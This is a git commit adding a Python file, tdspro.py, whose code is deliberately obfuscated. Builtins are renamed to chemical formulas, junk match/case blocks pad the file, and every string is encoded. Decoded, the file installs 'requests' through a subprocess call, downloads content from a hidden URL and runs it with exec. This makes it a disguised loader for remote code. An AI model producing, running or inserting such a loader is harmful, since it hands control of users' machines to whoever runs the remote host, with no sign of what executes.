f204ff10a7afdf056e64f1418a2a63d2fee32ef3
Thieu0112 <thieu2k10@gmail.com>
2026-02-19 09:30:45 +0700

    Add files via upload

---
+++ tdspro.py
@@ -0,0 +1,191 @@
+
+
+globals()['mol'] = (bool) if bool(bool(bool(bool))) < bool(type(int(810)>int(107)<int(911)>int(187))) and bool(str(str(313)>int(71)<int(114)>int(817))) > 2 else bool
+globals()['co2'] =  (str) if bool(bool(bool(str))) < bool(type(int(27)>int(41)<int(1518)>int(124))) and bool(str(str(1015)>int(12)<int(416)>int(184))) > 2 else str
+globals()['feo2'] =  (type) if bool(bool(bool(type))) < bool(type(int(1218)>int(915)<int(1318)>int(135))) and bool(str(str(24)>int(105)<int(119)>int(28))) > 2 else type
+globals()['h2so4'] =  (int) if bool(bool(bool(int))) < bool(type(int(1819)>int(124)<int(419)>int(1718))) and bool(str(str(97)>int(1112)<int(45)>int(913))) > 2 else int
+globals()['feso4'] =  (bytes) if bool(bool(bool(bytes))) < bool(type(int(1913)>int(14)<int(1411)>int(156))) and bool(str(str(1916)>int(32)<int(1116)>int(125))) > 2 else bytes
+globals()['agno3'] =  (vars) if bool(bool(bool(vars))) < bool(type(int(171)>int(917)<int(72)>int(42))) and bool(str(str(815)>int(117)<int(1216)>int(1012))) > 2 else vars
+globals()['h2'] =  (callable) if bool(bool(bool(callable))) < bool(type(int(310)>int(134)<int(181)>int(197))) and bool(str(str(81)>int(912)<int(184)>int(25))) > 2 else callable
+globals()['h2o3'] =  (eval) if bool(bool(bool(eval))) < bool(type(int(419)>int(313)<int(152)>int(1118))) and bool(str(str(117)>int(218)<int(18)>int(169))) > 2 else eval
+globals()['agno4'] =  (list) if bool(bool(bool(list))) < bool(type(int(1513)>int(74)<int(128)>int(1119))) and bool(str(str(910)>int(111)<int(1716)>int(126))) > 2 else list
+globals()['h3o'] =  (map) if bool(bool(bool(map))) < bool(type(int(59)>int(1518)<int(1217)>int(213))) and bool(str(str(54)>int(119)<int(181)>int(95))) > 2 else map
+
+globals()['ch2oh4p2so4'] =  (__import__) if bool(bool(bool(__import__))) < bool(type(int(217)>int(1612)<int(199)>int(613))) and bool(str(str(413)>int(37)<int(1310)>int(91))) > 2 else __import__
+
+globals()['tryᅠ'] =  (print) if bool(bool(bool(print))) < bool(type(int(126)>int(1713)<int(1318)>int(1016))) and bool(str(str(612)>int(315)<int(111)>int(418))) > 2 else print
+globals()['exceptᅠ'] =  (input) if bool(bool(bool(input))) < bool(type(int(416)>int(1016)<int(144)>int(98))) and bool(str(str(21)>int(113)<int(92)>int(213))) > 2 else input
+def h2o(july,*k):
+    if k:
+        enjuly19 = '+'
+        op = "+"
+    else:
+        enjuly19 = ''
+        op = ''
+    globals()['_86'] = (lambda: (lambda _1014: _1014 + (lambda : H2SbF7(30584))())(0) == 1)()
+    globals()['h2o'] = h2o
+    globals()['co2'] = co2
+    globals()['july'] = july
+    for globals()['enjuly19_'] in globals()['july']:
+        if not _86:globals()['enjuly19_'] += (lambda : '')()
+        enjuly19 += co2(enjuly19_);f = (lambda: (lambda _1211: _1211 + (lambda : H2SbF7(30584))())(0) == 1)()
+    return enjuly19
+def H2SbF7(x):
+    return h2so4(x-0x7777)
+def c2h6(e):
+    br = bytearray(e[len(b"enjuly19/"):])
+    r = 0
+    for b in br:
+        r = r * 256 + b
+    return r
+def longlongint(x):
+    ar = []
+    for i in x:
+        ar.append(h2o3(i))
+    return ar
+if (lambda: (lambda _58: _58 + (lambda : H2SbF7(30584))())(0) == 1)():
+    def o2(h2so3):
+        h2so3 = h2so3-0xFF78FF
+        if h2so3 <= 0x7F:
+                    return co2(feso4([h2so3]),"utf8")
+        elif h2so3 <= 0x7FF:
+                    if 1<2:
+                            b1 = 0xC0 | (h2so3 >> 6)
+                    b2 = 0x80 | (h2so3 & 0x3F)
+                    return co2(feso4([b1, b2]),"utf8")
+        elif h2so3 <= 0xFFFF:
+                b1 = 0xE0 | (h2so3 >> 12)
+                if 2>1:
+                    b2 = 0x80 | ((h2so3 >> 6) & 0x3F)
+                b3 = 0x80 | (h2so3 & 0x3F)
+                return co2(feso4([b1, b2, b3]),"utf8")
+        else:
+            b1 = 0xF0 | (h2so3 >> 18)
+            if 2==2:
+                b2 = 0x80 | ((h2so3 >> 12) & 0x3F)
+            if 1<2<3:
+                b3 = 0x80 | ((h2so3 >> 6) & 0x3F)
+            b4 = 0x80 | (h2so3 & 0x3F)
+            return co2(feso4([b1, b2, b3, b4]),"utf8")
+    def _hex(j):
+        h2so3 = ''
+        for _hex in j:
+            h2so3 += (o2(_hex))
+        return h2so3
+else:"enjuly19"
+try:
+    match '189' == '47':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _917 = [[True], [False]]
+            co2(['_61'])
+    raise MemoryError([True])
+except MemoryError as _916:
+    try:
+        match (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742704, 16742708, 16742710]))))())())() == (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742709, 16742705]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1215: _1215 + (lambda: H2SbF7(30584))())(0) == 1)()])
+            case False:
+                _1012 = [[(lambda: (lambda _147: _147 + (lambda: H2SbF7(30584))())(0) == 1)()], [(lambda: (lambda _1316: _1316 - (lambda: H2SbF7(30584))())(0) == 1)()]]
+                co2([(lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742750, 16742704, 16742712, 16742704, 16742708]))))())())()])
+        raise MemoryError([(lambda: (lambda _74: _74 + (lambda: H2SbF7(30584))())(0) == 1)()])
+    except MemoryError as _710:
+        import subprocess, sys
+try:
+    match '36' == '183':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _1214 = [[True], [False]]
+            co2(['_317'])
+    raise MemoryError([True])
+except MemoryError as _195:
+    try:
+        match (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742709, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742704, 16742708, 16742707]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1019: _1019 + (lambda: H2SbF7(30584))())(0) == 1)()])
+            case False:
+                _67 = [[(lambda: (lambda _1119: _1119 + (lambda: H2SbF7(30584))())(0) == 1)()], [(lambda: (lambda _113: _113 - (lambda: H2SbF7(30584))())(0) == 1)()]]
+                co2([(lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742750, 16742705, 16742704, 16742707]))))())())()])
+        raise MemoryError([(lambda: (lambda _92: _92 + (lambda: H2SbF7(30584))())(0) == 1)()])
+    except MemoryError as _32:
+        try:
+            import requests
+        except ImportError:
+            subprocess.check_call([sys.executable, (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffy,'))(), (lambda: c2h6(b'enjuly19/\xffyl'))()]))))())())(), (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffyo'))(), (lambda: c2h6(b'enjuly19/\xffyh'))(), (lambda: c2h6(b'enjuly19/\xffyo'))()]))))())())(), (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffyh'))(), (lambda: c2h6(b'enjuly19/\xffym'))(), (lambda: c2h6(b'enjuly19/\xffyr'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffy`'))(), (lambda: c2h6(b'enjuly19/\xffyk'))(), (lambda: c2h6(b'enjuly19/\xffyk'))()]))))())())(), (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffyq'))(), (lambda: c2h6(b'enjuly19/\xffyd'))(), (lambda: c2h6(b'enjuly19/\xffyp'))(), (lambda: c2h6(b'enjuly19/\xffyt'))(), (lambda: c2h6(b'enjuly19/\xffyd'))(), (lambda: c2h6(b'enjuly19/\xffyr'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffyr'))()]))))())())(), (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffy,'))(), (lambda: c2h6(b'enjuly19/\xffyp'))()]))))())())()])
+            import requests
+try:
+    match '1913' == '114':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _115 = [[True], [False]]
+            co2(['_151'])
+    raise MemoryError([True])
+except MemoryError as _73:
+    try:
+        match (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742704, 16742709, 16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742705, 16742710]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _126: _126 + (lambda: H2SbF7(30584))())(0) == 1)()])
+            case False:
+                _54 = [[(lambda: (lambda _27: _27 + (lambda: H2SbF7(30584))())(0) == 1)()], [(lambda: (lambda _76: _76 - (lambda: H2SbF7(30584))())(0) == 1)()]]
+                co2([(lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742750, 16742704, 16742706, 16742704, 16742703]))))())())()])
+        raise MemoryError([(lambda: (lambda _149: _149 + (lambda: H2SbF7(30584))())(0) == 1)()])
+    except MemoryError as _813:
+        URL = (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffyg'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffyo'))(), (lambda: c2h6(b'enjuly19/\xffyr'))(), (lambda: c2h6(b'enjuly19/\xffy9'))(), (lambda: c2h6(b'enjuly19/\xffy.'))(), (lambda: c2h6(b'enjuly19/\xffy.'))(), (lambda: c2h6(b'enjuly19/\xffyg'))(), (lambda: c2h6(b'enjuly19/\xffyn'))(), (lambda: c2h6(b'enjuly19/\xffy`'))(), (lambda: c2h6(b'enjuly19/\xffym'))(), (lambda: c2h6(b'enjuly19/\xffyf'))(), (lambda: c2h6(b'enjuly19/\xffyc'))(), (lambda: c2h6(b'enjuly19/\xffyt'))(), (lambda: c2h6(b'enjuly19/\xffyx'))(), (lambda: c2h6(b'enjuly19/\xffy-'))(), (lambda: c2h6(b'enjuly19/\xffyc'))(), (lambda: c2h6(b'enjuly19/\xffyd'))(), (lambda: c2h6(b'enjuly19/\xffyu'))(), (lambda: c2h6(b'enjuly19/\xffy.'))(), (lambda: c2h6(b'enjuly19/\xffyc'))(), (lambda: c2h6(b'enjuly19/\xffy`'))(), (lambda: c2h6(b'enjuly19/\xffyo'))(), (lambda: c2h6(b'enjuly19/\xffyh'))(), (lambda: c2h6(b'enjuly19/\xffy.'))(), (lambda: c2h6(b'enjuly19/\xffyS'))(), (lambda: c2h6(b'enjuly19/\xffyC'))(), (lambda: c2h6(b'enjuly19/\xffyR'))(), (lambda: c2h6(b'enjuly19/\xffy^'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffyn'))(), (lambda: c2h6(b'enjuly19/\xffyn'))(), (lambda: c2h6(b'enjuly19/\xffyk'))(), (lambda: c2h6(b'enjuly19/\xffyr'))(), (lambda: c2h6(b'enjuly19/\xffy.'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffyc'))(), (lambda: c2h6(b'enjuly19/\xffyr'))(), (lambda: c2h6(b'enjuly19/\xffy^'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffyn'))(), (lambda: c2h6(b'enjuly19/\xffyn'))(), (lambda: c2h6(b'enjuly19/\xffyk'))(), (lambda: c2h6(b'enjuly19/\xffy-'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffyw'))(), (lambda: c2h6(b'enjuly19/\xffys'))()]))))())())()
+try:
+    match '1115' == '1912':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _86 = [[True], [False]]
+            co2(['_1418'])
+    raise MemoryError([True])
+except MemoryError as _714:
+    try:
+        match (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742704, 16742708, 16742710]))))())())() == (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742704, 16742707, 16742704, 16742704]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _819: _819 + (lambda: H2SbF7(30584))())(0) == 1)()])
+            case False:
+                _1915 = [[(lambda: (lambda _1319: _1319 + (lambda: H2SbF7(30584))())(0) == 1)()], [(lambda: (lambda _418: _418 - (lambda: H2SbF7(30584))())(0) == 1)()]]
+                co2([(lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742750, 16742710, 16742704]))))())())()])
+        raise MemoryError([(lambda: (lambda _177: _177 + (lambda: H2SbF7(30584))())(0) == 1)()])
+    except MemoryError as _138:
+        try:
+            r = requests.get(URL, timeout=(lambda: c2h6(b'enjuly19/\n'))())
+            raw = r.content
+            try:
+                code = raw.decode((lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffyt'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffye'))(), (lambda: c2h6(b'enjuly19/\xffy,'))(), (lambda: c2h6(b'enjuly19/\xffy7'))()]))))())())())
+            except:
+                code = raw.decode((lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffyt'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffye'))(), (lambda: c2h6(b'enjuly19/\xffy,'))(), (lambda: c2h6(b'enjuly19/\xffy7'))()]))))())())(), (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffyh'))(), (lambda: c2h6(b'enjuly19/\xffyf'))(), (lambda: c2h6(b'enjuly19/\xffym'))(), (lambda: c2h6(b'enjuly19/\xffyn'))(), (lambda: c2h6(b'enjuly19/\xffyq'))(), (lambda: c2h6(b'enjuly19/\xffyd'))()]))))())())())
+        except:
+            tryᅠ((lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [(lambda: c2h6(b'enjuly19/\xffyJ'))(), (lambda: c2h6(b'enjuly19/\xff\x97\xbe'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffy\x1f'))(), (lambda: c2h6(b'enjuly19/\xffym'))(), (lambda: c2h6(b'enjuly19/\xff\x97\xd0'))(), (lambda: c2h6(b'enjuly19/\xffyh'))(), (lambda: c2h6(b'enjuly19/\xffy\x1f'))(), (lambda: c2h6(b'enjuly19/\xffyr'))(), (lambda: c2h6(b'enjuly19/\xffyd'))(), (lambda: c2h6(b'enjuly19/\xffyq'))(), (lambda: c2h6(b'enjuly19/\xffyu'))(), (lambda: c2h6(b'enjuly19/\xffyd'))(), (lambda: c2h6(b'enjuly19/\xffyq'))(), (lambda: c2h6(b'enjuly19/\xffy\x1f'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffyg'))(), (lambda: c2h6(b'enjuly19/\xff\x97\xa4'))(), (lambda: c2h6(b'enjuly19/\xffys'))(), (lambda: c2h6(b'enjuly19/\xffy\x1f'))(), (lambda: c2h6(b'enjuly19/\xffya'))(), (lambda: c2h6(b'enjuly19/\xff\x97\xa0'))(), (lambda: c2h6(b'enjuly19/\xffyh'))()]))))())())())
+            sys.exit()
+try:
+    match '212' == '1819':
+        case True:
+            
+            raise MemoryError([True])
+        case False:
+            _159 = [[True], [False]]
+            co2(['_137'])
+    raise MemoryError([True])
+except MemoryError as _94:
+    try:
+        match (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742704, 16742712, 16742704, 16742708]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _23: _23 + (lambda: H2SbF7(30584))())(0) == 1)()])
+            case False:
+                _27 = [[(lambda: (lambda _213: _213 + (lambda: H2SbF7(30584))())(0) == 1)()], [(lambda: (lambda _413: _413 - (lambda: H2SbF7(30584))())(0) == 1)()]]
+                co2([(lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742750, 16742706, 16742704, 16742706]))))())())()])
+        raise MemoryError([(lambda: (lambda _1014: _1014 + (lambda: H2SbF7(30584))())(0) == 1)()])
+    except MemoryError as _1511:
+        try:
+            exec(code, globals())
+        except Exception as e:
+            tryᅠ((lambda: (lambda: (lambda: h2o(agno4(h3o(o2, [16742778, 16742780]))))())())().format(e))
